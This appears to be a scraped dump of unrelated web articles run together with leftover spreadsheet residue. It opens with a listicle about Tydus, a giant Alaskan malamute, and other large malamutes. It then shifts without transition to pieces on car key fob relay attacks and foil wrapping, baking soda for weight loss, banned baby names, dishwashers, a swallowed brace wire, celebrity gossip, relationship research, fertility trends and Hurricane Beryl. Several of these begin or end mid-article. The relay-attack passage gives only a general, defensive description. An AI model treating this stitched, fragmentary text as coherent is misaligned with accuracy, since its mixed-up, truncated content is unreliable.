After weeks of waiting to see her precious new pup, the day finally she came when she could pick up her new fur baby. He had already grown quite a bit since the last time she saw him. Yumna had already chosen a name for him: Tydus. The name means “great, giant warrior” and it was extremely popular in ancient Rome, named after a local king. This little dog just had to be destined for great things.

Small and fluffy pooch, he was incredibly loveable and friendly from the get-go, and he already knew he was boss. Nonetheless, Yumna knew what she was getting into when she adopted an Alaskan malamute. She wasn’t particularly looking for a small dog breed and was fully aware that Tydus would grow bigger as he got older. The breed typically grows to quite a substantial size, but as she would soon find out, Tydus was more special than other Mamalutes.

5. Settling In

As soon as Tydus was brought home for the first time, he managed to settle in quite quickly. He was lavished with an array of toys, had a comfy new bed, plenty of food, and tons of attention around-the-clock in his new, loving home. Right off the bat, Tydus discovered his natural love of running around and frolicking in the grass with his toys like nobody’s business. He had so much open space in his new home. As he grew, he would definitely need it!

This cute Alaskan malamute was the little king of the household now and he loved all the joy he was getting at the new home. The little rascal loved to play with Yumna and made tons of human friends when Yumna’s friends and family came over to visit. He was such an active and affectionate puppy that he needed lots of attention. Fortunately, all those who met him were glad to give this growing dog what he wanted!



6. A Natural

Pictured here is Tydus when he was around eight weeks old. He couldn’t have been more adorable. As he explored and learned about the world around him, he discovered his favorite games and seemed to be trying to master the art of playing soccer. Moreover, he made the perfect dog model, always willing to pose for the camera with his photogenic furry face and funny antics.

The moment Tydus was welcomed into his new home, Yumna documented his every waking moment. Anybody would have done the same because, after all, a puppy doesn’t have to do much to look cute. All he had to do here was play with his soccer ball and smile. Little Tydus was also growing very quickly, and she didn’t want to miss a thing before he grew into a full size dog. By the time he was full grown, it would be hard to imagine this was the same dog.

7. Pool Time

Not only did Tydus the Dog have a huge garden to play in, he also had his very own swimming pool at Yumna’s home. Alaskan malamutes enjoy swimming, so she wanted him to get used to being around water as he grew into a bigger puppy. Pictured here is one of the occasions when they were trying to get Tydus acclimated to the pool scene. He seems to be having a nice time!

At this point, Tydus wasn’t quite ready to jump in and get all his fur wet just yet. He was just happy to get close to the pool and be able to play outside in the grass. Of course, Yumna made sure that this moment was documented too with the pooch smiling for the camera. Little Tydus always knew how to pose to get the perfect shot even as he continued to grow at an unbelievable pace.

8. Part of the Pack

It didn’t take long for Yumna and every member of the Saloojee clan to fall in love with Tydus. He was growing cuter and more lovable by the day and Tydus felt like another part of the family. More likely, Tydus now thought they were part of his! The pup never seemed to run out of energy. His favorite activity at this point was playing with all of Yumna’s family members and friends all day long.

His sweet face, adorable black eyes, perfectly fluffed hair, and pudgy little paws made Tydus the most irresistible puppy dog out there. Could he get even cuter? Yumna couldn’t have been happier with her decision to bring this Alaskan malamute beauty home. He was the perfect addition to the family even as he continued to grow day by day. Still, she had no idea what was about to be in store for her.

9. Getting Bigger

As all dog owners know, it is normal for puppies grow significantly bigger as they get older. Because of this, Yumna didn’t suspect anything odd about Tydus’s growth spurts in the beginning. From the day she picked him out, she knew he was going to be a relatively big dog, like most dogs of the Alaskan malamute breed. However, Tydus seemed to be doing things a little bit differently.

No one knew it just yet, but Tydus’s growth spurt starting to take off and surpass other dogs of his age. He continued to grow and grow and grow by the day and was quickly reaching his full-grown size. Yumna was totally besotted with her lovable Alaskan malamute and would love him in any shape, form, or size. But just how big was Tydus going to grow? It would only be a matter of time to find out.

10. Giant Great Warrior

As it turns out, Tydus was fast living up to the meaning of his name: Great Giant Warrior. He continued to grow exponentially as he began to grow from a tiny little thing into a full grown dog. Even though he was still a puppy, he had already reached the weight of a whopping 54 kilograms (120 lbs), which is already huge for an Alaskan malamute. Anyone who had seen Tydus from the start would hardly recognize him now!

The once-tiny pooch was growing into what looked more like a majestic-looking bear or lion. Yumna had no idea Tydus would grow to such a humongous size when she adopted him, but she adored him nevertheless and still thought he was the cutest thing around. Don’t think his big size stopped him from acting like a puppy either. He loved to run, jump and play more than ever, hardly aware of his size. How was she going to tend to such a big dog? For all she knew, he could get even bigger!

11. The Alaskan Malamute

A male Alaskan malamute usually reaches about 35 kilograms (85 lbs), and can stand at 65 centimeters (25 inches) high at the shoulder. In rare cases, the so-called “giant” versions can reach about 64 kilograms (140 lbs), but their bodies are not designed to carry that weight.

Clearly Tydus was way bigger and taller than the average malamute, but no one anticipated he could grow to be the size of a giant malamute when he was still just a puppy. So what exactly did this mean for Yumna?

12. Towering Over

When it comes to hugs, Tydus has never been shy. He loves jumping up to hug Yumna; the only problem is he towers over her with his giant size and all that fluff going on. At two years old, Tydus didn’t look like he was slowing down.

“To be honest, his size comes from all that magical fluff,” Yumna told Get Leashed magazine. “I don’t think he will get any bigger now, and that’s okay. I might get crushed if he does!” The funniest part of it all is that Tydus didn’t seem aware of his own size.

13. Cuddle Buddies

Yumna decided to make some use of all that fluff and fur by cuddling with Tydus every day. Only a giant Alaskan malamute like him could make the best cuddle buddy out there. He loves it so much that he smiles every time!

Even though Tydus outgrew his manageable puppy size very rapidly, Yumna continued to take pictures of her beloved bear all the time, enjoying the gift of having him. Continue reading to find out what happened after she shared her pictures with the world.

14. Overgrown Puppy

Despite his enormous size, Tydus continued to act like a puppy, blissfully unaware of his proportions. He climbed in Yumna’s lap even though he couldn’t fit. In fact, it’s his resemblance to a big bear that made him into more of a sweetheart.

While Yumna and her family got used to Tydus’s size, strangers in the streets started to notice this overgrown pooch and his abundant amount of fur. She feared people might get scared by the sheer size of her dog without knowing his personality, but people proved her wrong.

15. People’s Reactions

Every time Yumna took Tydus out for a walk in the streets to keep him active, he’d grab the attention of everyone who caught a glimpse of him. “His fluffiness is the first thing that catches attention, then his size,” Yumna told The Dodo.

She went on to say, “Wherever we go, even just for a walk around the block, we get stopped and asked about his size, age and most often, ‘What breed is he?’ I guess it’s not often that you see a lion-dog walking the street.” With all this positive attention, Yumna wanted to share her beautiful Alaskan malamute’s beauty with the world, and you won’t believe how!

16. A Social Media Star

Yumna was super excited to share her beautiful Alaskan malamute with the world, so she decided to create his very own Instagram page where she could upload different photos of him every day. She wanted to show off his dazzling personality.

Tydus the dog became a star with over 140,000 followers. “If his looks didn’t get your attention, his personality definitely will,” Yumna said about opening the account. “He has an amazing soul that earns everyone’s affection. He’s a little charmer … or giant charmer.” However, there was one other charmer joining in on the all the attention.

17. Trez, The Congo African Grey Parrot

The Instagram account was created for Tydus and all his shenanigans, but he shares it with his brother Trez, the Congo African Grey Parrot. In fact, the account is called Trez & Tydus, on which Trez the adorable bird often makes random appearances.

Yumna calls Trez “The Ruler of Everything” because of how he enjoys mimicking everyone around the house and sits there looking all regal. Tydus is more of the big friendly giant in the house, but they do play together at times.

18. Picture Perfect

Yumna absolutely adores her animals, especially when they play together and “behave” just long enough to pose for the camera. It seems like Tydus here wants all the attention, and he believes the best way to get it is by “gnawing” off his mother’s arm.

It’s pictures like these that Yumna chooses to share almost every day to capture all the cuteness and love of Tydus the dog. He behaves like an overgrown puppy, goofing around all day. If you think you’ve seen it all, continue reading to see what else this big ball of fur gets up to all the time.

19. Goofing Around

Most of the time Tydus is a serious goofball. He loves to have a romp around with his stuffed toys when he isn’t cuddling Yumna. Here, he is seen having a great time completely ripping poor little Mickey Mouse to pieces.

Well, for such a huge and high-energy Alaskan malamute, Yumna has to make sure he’s always entertained with some kind of activity. Besides for Mickey over here (or what’s left of him), Tydus also has a stuffed monkey he likes to chew to keep himself busy during the day.

20. Hey You, Freeze!

There are a few more favorite toys Tydus likes to play with. He especially loves his stuffed dinosaur and toy gun. We aren’t quite sure what the overgrown pooch is imagining in this situation, but he sure looks content – probably because he beat the dinosaur at a game of cops and robbers.

You might not know it at first glance, but Tydus has a very busy schedule planned out for him all day. When he’s not decimating Mickey Mouse or play-shooting his purple stuffed dinosaur, the malamute has some pretty serious business to take care of.

21. Helping Mama

When Tydus isn’t goofing about, he likes to help his mama Yumna get some work done. Just look at him appearing all sage and wise. He has those airs about him – as if he can advise Yumna about the ways of the world when he isn’t acting like an oversize puppy.

Well the bigger the dog, the bigger the heart, right? No doubt! In Tydus’s case it’s true, and he’s the best companion for all Yumna’s escapades and adventures both inside and outside the house. He also happens to make the best driving partner!

22. Just Cruising Through

When Yumna has places to go and people to see, she takes her big friendly giant Alaskan malamute with her for the ride. Tydus the Dog is just so big that people in traffic won’t want to mess with her.

Another benefit of taking Tydus for the ride is that other drivers might get distracted by his size and beauty and allow her to skip ahead when no one is watching. The love between these two just knows no bounds.

23. Fooling Around

One of Tydus’s favorite things to do is to chase and play wrestle Yumna to the ground. He tends to forget how big he is, and when Tydus starts playing, the fluffy bear of a dog is always in it to win it.

He looks massive next to Yumna, but it’s probably safe to say we wouldn’t mind having a wrestle with Tydus either. We have seriously fallen in love with his one-of-a-kind personality and how adorably unaware he is of his size.

24. Yippeeeeeee!!!

Every time Yumna comes back home, Tydus gets so excited he leaps into the air. He seriously looks like a flying bear. Just look at the smile on his face! Have you ever seen a happier Alaskan malamute in your lives? We certainly haven’t!

This picture pretty much sums up the love between Tydus the dog and his human mama, Yumna. It didn’t take her too long to get used to his huge size. He probably has to eat a whole lot of food, but it’s all worth it for her.

25. True Love

Yumna is so grateful she picked Tydus as her fur baby. She definitely didn’t think she’d be taking care of a giant Alaskan malamute, but his golden personality and his endlessly funny antics have only added to their special relationship.

A lot of the time, Tydus the Dog’s social media fame is associated with another famous dog. Tydus is occasionally having his thunder stolen by a husky-malamute dog named Loki the Wolfdog. He’s been breaking hearts since 2013 and has over 1.7 million Instagram followers.



26. Double Trouble

Tydus is not the only adorable Giant Alaskan Malamute around. This next guy posted a photo of himself with his two giant fur babies on Reddit and people went wild! He captioned the photo saying “My tiny puppies. I gotta get a bigger couch.”

Several people responded to the online poster, known only as Turdman 13. One commenter noted the challenges of having malamutes, writing that having them is a “Trade off: more money for food, lower hearing bill. Just cuddle.” We couldn’t agree more!



27. Onward!

Good luck trying to control these humongous dogs, buddy. It looks like they’re the ones who are trying to take him for a walk! With Giant Alaskan Malamutes like these, a simple afternoon walk requires amassing serious upper body strength first.

The dogs are raring to get walking and the poor owner is summoning all his strength to keep these giant fur babies in line. It might be hard work to take care of such huge dogs but they’re so cute, so it’s all worth it.



28. One Giant Pal

This Giant Alaskan Malamute is huge and it doesn’t seem that his human owner minds one bit. The pair look quite comfy on the couch, though it seems this dog has managed to outgrow what would otherwise be a spacious sofa.

This photo has even sparked its very own meme with the caption “I don’t know what type of dog this is, but I would definitely ride it into battle.” Yes, this looks like a dog you don’t want to mess with. Just cuddle!



29. All Paws

This next Giant Alaskan Malamute towers over his owners but still seems to think he’s still a tiny pup. In this video, the owners keep trying to teach him the “paw” command but he still has a bit of learning to do.

On each attempt, this giant fluffer ends up collapsing into a snuggle and cuddle puddle after giving one paw. We can forgive him while he learns because it’s all so adorable! There are still more majestic dogs on this list so keep reading!



30. The Real-Life Teddy Bear

Remember those giant teddy bears you used to win as a prize at carnivals? Well, this Giant Alaskan Malamute is what those teddy bears would look like if they came to life! This giant pooch is just as fluffy as he is tall!

This dog must wow everyone it meets because its practically as big as its owner (maybe even bigger, to be honest). The owner doesn’t seem to mind though, because together they are all smiles, having the times of their lives.



31. Evo And His Baby Buddy

Who is this super cute duo who know how to play ever so gently? It’s none other than Evo and Adam! Evo the Alaskan Malamute just adores his new baby buddy, Adam, who was only four months old when this precious photo was taken.

Alaskan Malamutes are known for being incredibly active but it seems that Evo has learned to calm down a bit when around his dear human companion. According to one article about them, Evo likes to show his affection for Adam by licking his socks. Aww!



32. Giddyup!

Giddyup, doggy! These baby’s face says it all. Maybe it was the baby’s first time meeting an Alaskan Malamute? Maybe the baby had simply never seen such a big creature in his life? Getting to understand that fabulous mass of fur definitely comes with a shock.

Hopefully, this pair grew up to be the best of friends just like Evo and Adam and will continue to have many play dates in the years to come — even if that baby gets way too big to ride even that kind of beast! These kind of dogs are true forever friends.



33. All Hugs

There’s nothing like the bond between a boy and his dog. As babies grow into kids, the love for their furry companions only keeps growing and the dogs themselves feel it right back. That’s certainly the case with this gorgeous pair.

This Giant Alaskan Malamute is certainly feeling the love right back, lucky enough to be embraced in a big bear hug of his own. The adorable little boy seems so calm despite the fact that his dog is practically twice his size.



34. Alaskan Malamute Utopia

British TV host Anna Svenska had the extra-fun work assignment of visiting and interviewing someone who’s quite likely the world’s biggest Giant Alaskan Malamute fan. She’s a woman named Lorna Bartlett who runs a small kennel called Arctic Rainbow Malamutes in Essex, England.

The 12 dogs who live with the Bartletts were practically as big Anna herself, as this photo easily demonstrates, and at the end of the day, she even got to ride a sort of dogsled with wheels! Definitely an experience to remember!



35. Danny Direwolf

Meet Danny, a 12 year old Giant Alaskan Malamute who has become a social media star along with his awesome owner, known only by her username Danny Direwolf. The giant fluff of a dog has actually had a long journey because he was rescued from Singapore.

The duo now live in Canada, where they go on adventures and take adorable photos together. Danny’s owner also shares plenty of tips for taking care of Alaskan Malamutes and shares it through regular YouTube vidoes. Time to get an education, folks!



36. Husky Star

Kelly Lund from Denver, Colorado came from a super passionate dog-loving family, so when he was ready to look for his own furry companion he felt like he was up for anything. He thought a husky mixed with malamute would do the trick.

Their journey started on a snowy day in 2012 when Lund brought Loki home. He knew it wouldn’t be easy seeing that both huskies and malamutes are extremely intelligent, mischievous, dominant, and highly energetic pets. Loki even had a bit of arctic wolf in him, so Lund knew he was in for one real challenge.



37. Snapping Away

From the moment Lund took Loki home he started taking pictures of his new companion and posting them on his Instagram. Most people take pictures of their dogs, but Lund couldn’t help taking photograph after beautiful photograph of his pal Loki, non-stop!

After all these dog pictures quickly began to swamp Lund’s account, he decided to make Loki his own Instagram profile called Loki the Wolfdog. In that way, his own profile wouldn’t look like it was hijacked by a pack of wolves, literally!



38. An Instagram Star

The Instagram page was an instant hit! Loki became a star overnight. Lund started the profile in 2013, and within a year the husky and malamute mix had a following of 50,000 fans. Local dog food companies even offered to give Loki food in exchange for some pictures and posts.

Lund didn’t start the page to make Loki famous. He didn’t even use hashtags and certainly didn’t pay any advertisers for followers. But things weren’t slowing down for Loki. By the end of 2015, he had nearly 1 million Instagram followers.



39. A Special Connection

Lund believes that all the success lies in the connection he and Loki share. “Loki’s an animal that can tell what you’re thinking and knows how you’re feeling,” he told Outside magazine. Lund had no formal photography training, but the shots he took were breathtaking.

His natural flair for photography coupled with Loki’s good looks and athleticism spelt success for the pair. Eventually Lund chose to leave his day job and manage Loki’s social media account full time because of deals and projects with the likes of Mercedes, GoPro, and Google.



40. A Full Time Pet Daddy

By 2017, Loki’s Instagram had 1.7 million followers and Lund still enjoys spending all his time with his best friend, honing in on his photography skills and running all kinds of business ventures. He also set up an online shop to sell prints of his wolf dog, as well as calendars, mugs, t-shirts, and other paraphernalia.

When asked about his success, Lund had this to say: “A while back, I saw a dog meme that said, ‘Do what you love and success will follow.’ The punch line was, ‘So I sat on my couch, ate pizza, and took selfies with my dog…I’m still waiting for the money to roll in.’ Turned out that actually worked for me.”

With an unprotected fob, thieves can intercept the signal from the fob to a car with a special receiver, known as a “relay attack”. They can then use this to enter the car and even turn on the ignition. But there's a simple solution, as it appears just wrapping your fob in foil prevents the signals from being transmitted.

“Although it's not ideal, it is the most inexpensive way,” Holly Hubert, a cybersecurity expert, told the Detroit Free Press. “The cyber threat is so dynamic and ever changing, it’s hard for consumers to keep up.”

According to Wired, the attack tricks the car and your key into thinking they're in close proximity of each other. “One hacker holds a device a few feet from the victim's key, while a thief holds the other near the target car,” they said. “The device near the car spoofs a signal from the key.”

While it appears that ordinary foil will do the trick, Hubert suggests purchasing a Faraday bag, a small bag lined with metallic material to prevent signals from going in or out. You can use them for other devices too, like phones or tablets.

Speaking to ABC News, the National Insurance Crime Bureau said there had been no confirmed cases of a relay attack in the US. However, it does appear to be a known risk that car companies are trying to tackle, and there have been unverified reports of such attacks.

In the UK, Bristol resident Kieran Bingham claimed someone had broken into his car with a fake wireless fob. He said that when he went in the car, he found the glove box had been opened and items had been scattered, reports the Bristol Post.

“My thinking is someone is going round hacking wireless keys,” Bingham said. “That’s why I’ve wrapped it in foil, to stop the device finding your keys.”

It’s not just foil that can stop thieves though. A fridge or freezer, microwave oven, or even a metal biscuit tin can also apparently stop the signal from being intercepted. Just don’t get your fob all biscuity, or accidentally turn the microwave on with it inside.",Here's Why You Should Probably Wrap Your Car Keys In Tin Foil,

Should You Start Drinking Baking Soda For Weight Loss?

IDK why you'd want to, tho.
",13/07/2018 12:15,"https://www.medicalnewstoday.com/articles/drinking-baking-soda-for-weight-loss#:~:text=There%20is%20no%20scientific%20evidence%20that%20baking%20soda%20is%20effective,a%20healthcare%20provider%20recommends%20it.","Baking soda is a common household item that people may use in baking and for treating indigestion. Some people try to use baking soda for weight loss. People considering using baking soda for this purpose should bear in mind the serious health risks. Below, we explore whether baking soda actually works for weight loss, as well as the safety concerns and potential side effects of using it. We also explain how to lose weight in a healthful way.

The theory Share on Pinterest Image credit: Michelle Arnold / EyeEm / Getty Images. Some people consume baking soda as a way to lose weight. They may drink it with water or another liquid. However, there is no scientific evidence to suggest that baking soda helps a person lose weight.

Does it work? Baking soda, also known as sodium bicarbonate, is slightly alkaline. Some people believe that ingesting alkaline substances promotes weight loss. However, scientific research has not found evidence to support this theory. The body naturally regulates its pH levels to ensure that it is not too acidic or alkaline. What a person eats has very little effect on this process. Therefore, consuming baking soda to make the body more alkaline and promote weight loss is very unlikely to work. Drinking baking soda with water is one method that people may use to try to lose weight. In some cases, this may help a person lose weight, but probably not because of the baking soda. Research suggests that consuming more water can help a person lose weight. Therefore, any weight loss that a person experiences from drinking baking soda with water may be due to the water rather than the baking soda. By drinking more water, people may not feel the need to eat as much. In addition, having higher amounts of water in the body may promote the breakdown of fats.

Safety concerns Consuming baking soda can cause a variety of side effects. If people ingest baking soda, they will need to urinate more , which doctors call bicarbonate diuresis. By urinating more than usual, the body loses chloride, sodium, potassium, and water, all of which are necessary for normal bodily functions. Too much baking soda can impair the way the kidneys work, potentially preventing the kidneys from filtering out the baking soda properly. In extreme cases, dehydration from needing to urinate and being unable to replenish the water in the body may cause serious complications. In one case study , an individual experienced hemorrhagic encephalopathy, which involves bleeding and inflammation in the brain, after ingesting a large amount of baking soda. The authors suggested that this may have happened because consuming large amounts of baking soda can cause higher-than-normal levels of sodium in the blood, known as hypernatremia. In severe cases, hypernatremia may cause the neurons and cells in the brain to shrink. This shrinkage may cause brain hemorrhages because it increases the tension on veins in the cranium, which eventually ruptures the blood vessels. People often experience vomiting and diarrhea after ingesting too much baking soda. The reason for this is that the high amount of sodium pulls water into the digestive tract to help absorb it. After the body absorbs this sodium, it can cause seizures, dehydration, and kidney failure. People may also find it difficult to breathe after ingesting too much baking soda. If the body becomes too alkaline, it works to restore its acidity by keeping carbon dioxide inside the lungs rather than breathing it out. Another very serious potential side effect of ingesting too much baking soda is stomach rupture, which can happen due to the rapid formation of gas in the stomach. People are more likely to experience a stomach rupture after drinking alcohol or eating a large meal, as these activities increase the amount of gas already in the stomach.

Recommendation Poison Control recommend that people do not ingest baking soda by itself for any reason unless a healthcare provider directs them to do so. In that case, they should only take baking soda as their healthcare provider recommends. Certain people are more at risk of side effects than others. People who should avoid using baking soda include older adults and those who have alcohol use disorder, a lower volume of blood in the body, or kidney or lung disease. People should always contact their healthcare provider if they are using baking soda for anything other than baking or cooking. The potential side effects of consuming baking soda in large amounts on its own or with water are potentially very serious. A person who has done so may need emergency medical attention.

Healthful weight loss People are more likely to reach and maintain their goal weight by losing weight gradually and steadily. The Centers for Disease Control and Prevention (CDC) recommend that people lose no more than 2 pounds (lb) , or 0.9 kilograms, per week. Physical activity An important step for weight loss is setting realistic goals. These goals should be a mix of long- and short-term, each with a reward at the end. For example, if a person wants to lose 10 lb, that could be a long-term goal. A short-term goal could be the number of steps a person aims to take each day to lose that weight. Other short-term goals could be walking to and from work or going for a 20-minute bicycle ride over the weekend. Short-term goals should be specific and realistic. For one reason or another, such as a longer day at work or family commitments, people may not reach their short-term goals. This is completely normal , and people should just try to set new, achievable goals as soon as they can. Healthful eating Healthful eating habits are vital for losing weight in a sustainable way. Most people form their eating habits during childhood, and it can be difficult, but not impossible, to change them. It is important not to make sudden, drastic changes to the diet, such as only eating a salad at every meal. Although this approach may lead to short-term weight loss, it is very difficult to stick to and may not give people all of the nutrients that they need. Instead, the CDC suggest a three-step approach for developing more healthful eating habits: Reflect on eating habits, both good and bad, and identify any triggers for those that are unhealthful. Replace less healthful eating habits with more healthful ones. Reinforce the new eating habits. For example, if a person realizes that they eat too quickly, they can consciously focus on eating more slowly. They can do this by purposely putting down their eating utensils between bites, among other tactics. Another strategy is to make a healthful meal plan, then meal prep for the following week. A person can make all of their meals for the week during the weekend. Doing this can help reduce the temptation of buying takeout or fast food. As with physical activity goals, it is important that people do not think that 1 day of eating with their old habits means that all of their efforts are pointless. Setbacks do happen, but it is important that people start afresh the next day and continue reinforcing their new, healthful habits.",Drinking baking soda for weight loss: Does it work?,

The world was shocked when Chris Martin and Gwyneth Paltrow named their daughter Apple in 2004.

But since then food-related baby names have become big news.

A recent BabyCentre post revealed baby names such as Saffron, Honey, Kale, Coco and Apricot are becoming more popular in 2018.

However one couple, who took it too far, had their baby name banned by a French judge.

The parents wanted to call their newborn daughter Nutella – because they hoped she could emulate the sweetness and popularity of the chocolate spread.

However, a judge ruled the name could only lead to “mockery and disobliging remarks.”

It was ruled that the child’s name be shortened to the more conventional “Ella.”

Another couple from New Zealand made up a very inappropriate name for their baby.

The pair wanted to call their tot “Sex Fruit”, but thankfully the New Zealand government stepped in and banned the moniker.",Banned baby name: Couple try to name daughter after THIS popular food brand,

",11/07/2018 15:39,https://www.sciencealert.com/is-it-better-to-wash-dishes-by-hand-or-dishwasher-environment-science,"It's a very human trait to assume that, no matter how far we advance technology, machines will never be able to replace our skills.

Take doing the dishes for example: the first dishwasher was built back in 1850, but more than 150 years later, and many of us still do our dishes ourselves, or at least take the time to pre-wash them before loading them into a dishwasher.

But according to the stats, modern dishwashers are now officially faster, more hygienic and way better for the environment that we'll ever be. So maybe it's finally time to give in and let the machines take over.

Or as Consumer Reports puts it, it's time to just ""let the dishwasher do its job"".

There's still the prevailing myth that washing by hand is cleaner and better for the environment - particularly if you manage to use just one sink-full of water for a whole family's worth of dishes.

But research shows that this isn't the case anymore, with dishwashers becoming not only far cheaper to run, but also much more water- and energy-efficient.

""While it may be possible to use less water/energy by washing dishes by hand, it is extremely unlikely,"" Jonah Schein, the technical coordinator for homes and buildings from the Environmental Protection Agency's WaterSense program, referring to Energy Star-certified dishwashers, said in a statement.

""In order to wash the same amount of dishes that can fit in a single load of a full size dishwasher and use less water, you would need to be able to wash eight full place settings and still limit the total amount of time that the faucet was running to less than two minutes,"" he adds.

OK we get it - it's hard to use less water than a machine. But surely we still need to give dishwashers a helping hand by giving dishes a quick rinse before loading them in?

Unfortunately not, according to Steven Nadel, the executive director of the American Council for an Energy Efficient Economy. In fact, if you've got a modern dishwasher, it's totally unnecessary to do anything but scrape the food scraps off plates.

""Old dishwashers, to generalise, didn't get dishes very clean unless you pre-washed,"" Nadel told Chris Mooney over at The Washington Post back in 2015.

""The new dishwashers, that is not an issue. Almost all of them have what's called soil sensors. Depending on how dirty the dishes are, they will wash more or less. They will get the dishes clean.""

Dishwashers can also spray highly controlled jets of water upwards of 60 degrees Celsius (140 Fahrenheit) at the dishes, something our human hands can't handle - although experts recommend you only need to set it as high as around 48 degrees Celsius (120 Fahrenheit).

""The worst approach for the environment - and energy and water bills - is pre-washing dishes in constantly running hot water and then running them in an ancient dishwasher that was not built to modern standards,"" wrote Mooney.

In fact, by pre-washing our dishes, Consumer Reports suggests that households could be wasting more than 22,000 litres (6,000 gallons) of water per year.

Still not convinced that a machine can do household chores better than you? Well, we hate to tell you this, but you're literally wasting your life.

The Energy Star program has worked out that handing over all dishwashing responsibilities to a machine saves you 230 hours, or nearly 10 days, each year. Which makes for a pretty compelling argument.

So what are you going to do with all your newly found spare time? Why not make yourself useful and work on some environment-helping citizen science projects, or help edit some of the breathtaking raw footage of Jupiter taken by NASA's Juno probe. Who said technology didn't need us?

But their tests found none of the normal causes.

One of her doctors reported that her heart rate was faster than normal and the lining of her abdominal wall was inflamed.

But after further investigation, her vital signs, laboratory tests, ultrasound and the scans of her liver, gallbladder and bile ducts were all normal

When they asked her if she had recently undergone a surgery, the unnamed woman replied ""no."" This eliminated the possibility that a surgeon accidentally left behind a foreign object, but, after looking at a CT scan, doctors realized that something metallic was definitely in there.

When they removed the object, they couldn't believe what it was. Find out for yourself on the next page!

Even though she had not had surgery and doesn't recall swallowing a piece of metal, doctors confirmed that their patient definitely had a foreign object lodged in her intestines - but what could it be?

The 2 1/2 inch-long piece of metal was a piece of dental brace wire that she had accidentally swallowed at least a decade ago!

Doctors were baffled by how she had managed to swallow it without noticing.

""The case is so unique is because normally if you swallow something like that, it presents earlier,"" doctor Talia Shepherd told Popular Science.

Apparently the woman had worn braces 10 years earlier, and has since had them removed. The piece she swallowed didn't cause her any pain until recently, when it caused her intestine to twist around on itself.

""We were all a bit dumbfounded,"" Shepherd told the magazine. ""It wasn't what I was expecting to find at all.""

Thankfully, surgeons were able to repair remove the object and repair the damage. Good thing they caught it in time!

TMZ broke the flash engagement news Sunday morning (July 8), and noted that Bieber proposed to his model girlfriend during the couple's recent getaway to the Bahamas. And while fans have been excited by the prospect of the marriage-to-be, Us Weekly reports that Gomez couldn't be more unmoved by the news.

“Selena doesn’t care. She’s over Justin and the last time they broke up allowed her to get over him fully,” a source told the site.

The source also noted that Bieber may have made the proposal so public to get a rise out of Gomez.

“Anytime he has done this in the past, Selena doesn’t even see stories about him in the media,” the source added. “Her team makes sure she is protected from it, so it’s a waste of time on Justin’s end if that’s his goal. No one in her circle speaks about him when they are on the outs and she keeps her circle and team very small.”

Bieber and Baldwin, who dated from 2015 to 2016, only reconciled a month ago. Bieber and Gomez rekindled their romance in late 2017, five years after a very public breakup. They split again months later, though, mostly due to pressure from Gomez's mother, who had misgivings about the relationship.",Selena Gomez Has Something to Say About Justin Bieber’s Engagement,

Psychologists say one behavior is the 'kiss of death’ for a
relationship

On the way home from work you have every intention of greeting your partner with a friendly ""Hi, how are you? How was your day?"" and listening attentively while he or she tells you all about it.

But the minute you open the door and drop your keys on the counter, you find yourself knee-deep in an argument about how he or she bought the wrong type of pepper.

Don't worry: It's perfectly normal to get into arguments like these with your significant other every once in a while, says John Gottman, a psychologist at the University of Washington and founder of the Gottman Institute.

It's what happens next that you need to watch out for, he says.

When you express your frustration over the pepper mix-up, do you listen while he explains that perhaps you didn't ever tell him what type of pepper you wanted? Do you think this over, and, when you realize that maybe he's right, do you apologize? Or do you adopt an attitude and think to yourself, What kind of an idiot doesn't know that bell peppers are for stir-fry and habaneros are for salsa?

If you find yourself in the second situation, you're likely displaying contempt for your partner, and it could be putting your relationship in jeopardy.

Contempt, a virulent mix of anger and disgust, is far more toxic than simple frustration or negativity. It involves seeing your partner as beneath you, rather than as an equal.

Gottman and University of California-Berkeley psychologist Robert Levenson found this single behavior is so powerful that they can use it — along with the negative behaviors of criticism, defensiveness, and stonewalling — to predict divorce with 93% accuracy

""Contempt,"" says Gottman, ""is the kiss of death.""

The striking 93% figure comes from a 14-year study of 79 couples living across the US Midwest (21 of whom divorced during the study period) published in 2002. Since then, decades of research into marriage and divorce have lent further support to the idea linking divorce with specific negative behaviors.

One recent study of 373 newlywed couples, for example, found that couples who yelled at each other, showed contempt for each other, or simply began to disengage from conflict within the first year of marriage were more likely to divorce, even as far as 16 years down the road.

So why are couples who exhibit this one behavior more likely to split up?

It comes down to a superiority complex.

Feeling smarter than, better than, or more sensitive than your significant other means you're not only less likely see his or her opinions as valid, but, more important, you're far less willing to try to put yourself in his or her shoes to try to see a situation from his or her perspective.

Picture a resonance chamber, suggests Gottman, with each person in the relationship a source of his or her own musical (or emotional) vibrations. If each partner is closed off to the other person's vibes (or emotions) and more interested in unleashing their own feelings of disgust and superiority, these negative vibrations will resound against one another, escalating a bad situation ""until something breaks,"" Gottman says.

If you've noticed yourself or your partner exhibiting this type of behavior, don't despair — it doesn't mean your relationship is doomed.

Being aware that you're doing something that could negatively affect your partner is the first step to actively combating it. If you can figure out how to avoid the behavior or replace it with a more positive one, you'll likely greatly improve the relationship — and increase your chances of staying together for longer.",Scientists say one behavior is the 'kiss of death' for a relationship,

This generation, unlike the ones that came before it, is as likely as not to earn less than their parents. Among people who did not plan to have children, 23 percent said it was because they were worried about the economy. A third said they couldn’t afford child care, 24 percent said they couldn’t afford a house and 13 percent cited student debt.

Financial concerns also led people to have fewer children than what they considered to be ideal: 64 percent said it was because child care was too expensive, 43 percent said they waited too long because of financial instability and about 40 percent said it was because of a lack of paid family leave.

Women face another economic obstacle: Their careers can stall when they become mothers.

This spring, Brittany Butler, 22, became the first person in her family to graduate from college, and she will start graduate school in social work in the fall. She said it would probably be at least 10 years before she considered having children, until she could raise them in very different circumstances than in her poor hometown neighborhood in Baton Rouge, La.

She admits being “a little nervous” that it may become harder to get pregnant, but she wants to pay off her student loans and, most of all, be able to live in a safe neighborhood.

“A lot of people, especially communities of color, can’t really afford that now,” she said. “I’m just apprehensive about going back to poverty. I know how it goes, I know the effects of it, and I’m thinking, ‘Can I ever break this curse?’ I would just like to change the narrative around.”

Starting a family used to be what people did to embark on adulthood; now many say they want to wait. Last year, the only age group in which the fertility rate increased was women ages 40 to 44.

Hurricane Beryl Is Officially the First Atlantic Hurricane of the Year.
Here's Where it's Headed
",6/07/2018 10:02,https://time.com/5331664/hurricane-beryl-path-track/,"Hurricane Beryl was downgraded to a tropical storm Saturday morning, after being named the first hurricane of this year’s Atlantic hurricane season on Friday.

The path of the relatively tiny Tropical Storm Beryl is currently tracking westwards through the Atlantic in the general direction of Puerto Rico, the Dominican Republic and Haiti. It is expected to reach the Lesser Antilles by Sunday night or Monday, according to the National Hurricane Center (NHS).

